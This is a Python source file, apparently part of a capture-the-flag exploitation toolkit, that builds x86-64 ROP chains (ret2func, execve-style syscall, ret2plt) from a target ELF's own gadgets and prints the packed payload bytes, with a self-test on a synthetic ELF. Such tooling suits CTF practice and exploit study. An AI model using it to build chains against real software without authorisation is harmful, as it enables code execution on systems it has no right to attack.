#!/usr/bin/env python3
"""rop_chain.py -- assemble an x86-64 ROP chain from the binary's own gadgets.

pwn_triage --gadgets lists what exists; this packs it into a chain.
Every gadget address is verified present in the target's executable
segments before it is used, and a chain that needs a gadget the binary
does not have is refused with the missing pieces named -- never a fake
chain built from a different binary's gadgets.

  python3 tools/rop_chain.py ./chal ret2func --func 0x401160 --arg 0x404060
  python3 tools/rop_chain.py ./chal ret2func --func 0x401160 \
      --arg 0x404060 --arg2 0 --arg3 0
  python3 tools/rop_chain.py ./chal syscall --num 59 --arg 0x404030
  python3 tools/rop_chain.py ./chal ret2plt --plt puts --arg 0x404018
  python3 tools/rop_chain.py --selftest

Output: the ordered qwords (addr, what-it-does), the packed chain as
hex, and the byte length -- prepend your offset-to-RIP padding and
the cyclic offset from tools/pwn_cyclic.py.
"""
import argparse
import json
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pwnstatic import elf as _elf                     # noqa: E402
from pwnstatic import gadgets as _gad                 # noqa: E402

POP = {"rdi": "pop rdi ; ret", "rsi": "pop rsi ; ret",
       "rdx": "pop rdx ; ret", "rax": "pop rax ; ret",
       "rdi_rsi": "pop rdi ; pop rsi ; ret"}


def _find(e):
    have = {}
    for g in _gad.find(e):
        have.setdefault(g["gadget"], int(g["addr"], 16))
    return have


def ret2func(have, func, args):
    """pop arg registers in order; a bare ret keeps rsp 16-aligned."""
    chain, missing = [], []
    regs = ["rdi", "rsi", "rdx"]
    pairs = [(regs[i], a) for i, a in enumerate(args) if a is not None]
    used_rirsi = False
    if len(pairs) >= 2 and pairs[0][0] == "rdi" and pairs[1][0] == "rsi" \
            and POP["rdi_rsi"] in have:
        chain.append({"addr": have[POP["rdi_rsi"]],
                      "what": "pop rdi ; pop rsi ; ret"})
        chain.append({"addr": pairs[0][1], "what": "rdi <="})
        chain.append({"addr": pairs[1][1], "what": "rsi <="})
        pairs, used_rirsi = pairs[2:], True
    for reg, val in pairs:
        g = POP[reg]
        if g not in have:
            missing.append(g)
            continue
        chain.append({"addr": have[g], "what": g})
        chain.append({"addr": val, "what": "%s <=" % reg})
    if missing:
        return None, missing
    # one gadget + one value = 16 bytes per arg; a bare ret realigns when
    # the arg count (after packing rdi/rsi together) is odd
    if len([c for c in chain if str(c["what"]).endswith("ret")]) % 2:
        if "ret" not in have:
            return None, ["ret (alignment)"]
        chain.append({"addr": have["ret"], "what": "ret ; align"})
    chain.append({"addr": func, "what": "call target"})
    return chain, []


def syscall_chain(have, num, args):
    need = ["pop rax ; ret", "syscall ; ret", "syscall"]
    if "syscall ; ret" not in have and "syscall" not in have:
        return None, ["syscall"]
    have_sc = "syscall ; ret" if "syscall ; ret" in have else "syscall"
    chain, missing = [], []
    if "pop rax ; ret" not in have:
        missing.append("pop rax ; ret")
    else:
        chain += [{"addr": have["pop rax ; ret"], "what": "pop rax ; ret"},
                  {"addr": num, "what": "rax = syscall number"}]
    for reg, val in zip(["rdi", "rsi", "rdx"], args):
        if val is None:
            continue
        g = POP[reg]
        if g not in have:
            missing.append(g)
        else:
            chain += [{"addr": have[g], "what": g},
                      {"addr": val, "what": "%s <=" % reg}]
    if missing:
        return None, missing
    chain.append({"addr": have[have_sc], "what": have_sc})
    return chain, []


def _relocs(e):
    """-> [(got_slot_vaddr, symbol)] from .rela.plt / .rel.plt."""
    out = []
    dsym, dstr = e.section(".dynsym"), e.section(".dynstr")
    if not dsym or not dstr or not dsym["entsize"]:
        return out
    for nm in (".rela.plt", ".rel.plt"):
        r = e.section(nm)
        if not r or not r["entsize"]:
            continue
        is64 = e.bits == 64
        for i in range(r["size"] // r["entsize"]):
            o = r["offset"] + i * r["entsize"]
            roff, rinfo = (e._u64(o), e._u64(o + 8)) if is64 \
                else (e._u32(o), e._u32(o + 4))
            sidx = rinfo >> (32 if is64 else 8)
            so = dsym["offset"] + sidx * dsym["entsize"]
            if so + 4 <= len(e.data):
                name = e._cstr(dstr["offset"] + e._u32(so))
                out.append((roff, name))
    return out


def _plt_stub(e, got):
    """Resolve the .plt stub that jumps through the GOT slot `got`.

    x86-64 stubs are `ff 25 <disp32>; push idx; jmp plt0` — the disp is
    relative to the instruction's end, so target = stub+6+disp.
    """
    plt = e.section(".plt")
    if not plt:
        return None
    blob = e.data[plt["offset"]:plt["offset"] + plt["size"]]
    for off in range(0, len(blob) - 6, 16):
        if blob[off:off + 2] == b"\xff\x25":
            disp = struct.unpack("<i", blob[off + 2:off + 6])[0]
            if plt["addr"] + off + 6 + disp == got:
                return plt["addr"] + off
    return None


def _mkelf():
    """Minimal ELF64: exec LOAD with gadgets+plt stubs, dynsym/rela/plt."""
    e = "<"
    GOT, PUTS_STUB = 0x404018, 0x401030
    shstr = b"\x00.text\x00.plt\x00.dynsym\x00.dynstr\x00" \
            b".rela.plt\x00.shstrtab\x00"
    name = {n: shstr.index(n.encode()) for n in
            (".text", ".plt", ".dynsym", ".dynstr", ".rela.plt",
             ".shstrtab")}
    text = b"\x5f\xc3" + b"\xc3" + b"\x58\xc3" + b"\x0f\x05" \
        + b"\x90" * (0x20 - 7)               # 0x401000..0x40101f
    plt = b"\x90" * 16 \
        + b"\xff\x25" + struct.pack("<i", GOT - (PUTS_STUB + 6)) \
        + b"\x90" * (16 - 6)                 # 0x401020..0x40103f
    dynstr = b"\x00puts\x00"
    dynsym = b"\x00" * 24 \
        + struct.pack("<IBBHQQ", 1, 0x12, 0, 1, 0, 0)
    rela = struct.pack("<QQq", GOT, (1 << 32) | 7, 0)
    img = bytearray(0x600)
    img[0:16] = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
    struct.pack_into("<HHIQQQIHHHHHH", img, 16, 2, 0x3E, 1, 0x401000,
                     0x40, 0x400, 0, 64, 56, 1, 64, 7, 6)
    struct.pack_into("<IIQQQQQQ", img, 0x40, 1, 5, 0x100, 0x401000,
                     0x401000, 0x400, 0x400, 0x1000)
    img[0x100:0x100 + len(text)] = text
    img[0x120:0x120 + len(plt)] = plt
    img[0x180:0x180 + len(dynsym)] = dynsym
    img[0x1C0:0x1C0 + len(dynstr)] = dynstr
    img[0x1E0:0x1E0 + len(rela)] = rela
    img[0x200:0x200 + len(shstr)] = shstr
    sec = [(0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
           (name[".text"], 1, 6, 0x401000, 0x100, len(text), 0, 0, 16, 0),
           (name[".plt"], 1, 6, 0x401020, 0x120, len(plt), 0, 0, 16, 16),
           (name[".dynsym"], 11, 0, 0, 0x180, len(dynsym), 4, 1, 8, 24),
           (name[".dynstr"], 3, 0, 0, 0x1C0, len(dynstr), 0, 0, 1, 0),
           (name[".rela.plt"], 4, 0, 0, 0x1E0, len(rela), 3, 0, 8, 24),
           (name[".shstrtab"], 3, 0, 0, 0x200, len(shstr), 0, 0, 1, 0)]
    for i, s in enumerate(sec):
        struct.pack_into("<IIQQQQIIQQ", img, 0x400 + i * 64, *s)
    return bytes(img), GOT, PUTS_STUB


def _selftest():
    have = {"pop rdi ; ret": 0x401010, "ret": 0x401016,
            "pop rax ; ret": 0x401100, "syscall ; ret": 0x401200}
    chain, miss = ret2func(have, 0x401500, [0x404060])
    assert not miss, miss
    assert chain[0]["addr"] == 0x401010 and chain[1]["addr"] == 0x404060
    assert chain[2]["what"].startswith("ret") \
        and chain[3]["addr"] == 0x401500, chain
    blob = b"".join(struct.pack("<Q", c["addr"]) for c in chain)
    assert len(blob) == 32 and blob[:8] == struct.pack("<Q", 0x401010)
    c2, m2 = ret2func({"ret": 0x1}, 0xdead, [0x1])
    assert c2 is None and m2 == ["pop rdi ; ret"], m2
    c3, m3 = syscall_chain(have, 59, [0x404030])
    assert not m3 and c3[-1]["addr"] == 0x401200 and c3[1]["addr"] == 59
    # real ELF end-to-end: gadgets found by pattern, puts@plt resolved by
    # decoding the ff 25 stub back to its GOT slot
    img, got, stub = _mkelf()
    e = _elf.ELF(img)
    have2 = _find(e)
    assert have2["pop rdi ; ret"] == 0x401000, have2
    assert "ret" in have2 and "syscall" in have2, have2
    rel = _relocs(e)
    assert rel == [(got, "puts")], rel
    assert _plt_stub(e, got) == stub
    print("rop_chain selftest: ok")


def main():
    ap = argparse.ArgumentParser(description="x86-64 ROP chain assembly")
    ap.add_argument("elf", nargs="?", help="target ELF (gadgets come from it)")
    ap.add_argument("mode", nargs="?", choices=["ret2func", "syscall",
                                              "ret2plt"])
    ap.add_argument("--func", type=lambda x: int(x, 0),
                    help="callee address for ret2func")
    ap.add_argument("--plt", help="PLT name for ret2plt (needs elf_info relocs)")
    ap.add_argument("--num", type=lambda x: int(x, 0),
                    help="syscall number for syscall mode")
    for n in ("arg", "arg2", "arg3"):
        ap.add_argument("--" + n, type=lambda x: int(x, 0))
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not a.elf or not a.mode:
        ap.error("elf and mode required")
    e = _elf.ELF(open(a.elf, "rb").read())
    have = _find(e)
    args = [x for x in (a.arg, a.arg2, a.arg3) if x is not None]
    if a.mode == "ret2func":
        if a.func is None:
            ap.error("ret2func needs --func")
        chain, miss = ret2func(have, a.func, args)
    elif a.mode == "syscall":
        if a.num is None:
            ap.error("syscall needs --num")
        chain, miss = syscall_chain(have, a.num, args)
    else:  # ret2plt
        rel = [r for r in _relocs(e) if r[1] == a.plt]
        if not rel:
            print(json.dumps({"error": "no .plt relocation for " + str(a.plt),
                              "available": sorted({n for _, n in _relocs(e)})}))
            return 1
        stub = _plt_stub(e, rel[0][0])
        if stub is None:
            print(json.dumps({"error": "no .plt stub decodes to the GOT slot",
                              "got": hex(rel[0][0])}))
            return 1
        chain, miss = ret2func(have, stub, args)
        if chain:
            chain[-1]["what"] = "%s@plt" % a.plt
    if chain is None:
        print(json.dumps({"error": "binary lacks required gadgets",
                          "missing": miss,
                          "have": sorted(have)}))
        return 1
    blob = b"".join(struct.pack("<Q", c["addr"])
                    for c in chain if isinstance(c["addr"], int))
    print(json.dumps({
        "mode": a.mode,
        "gadgets_used": [c["what"] for c in chain],
        "chain": [{"addr": hex(c["addr"]) if isinstance(c["addr"], int)
                   else c["addr"], "what": c["what"]} for c in chain],
        "packed_hex": blob.hex() if len(blob) == 8 * len(chain) else
        "incomplete: resolve the noted entry first",
        "chain_qwords": len(chain)}))


if __name__ == "__main__":
    raise SystemExit(main())
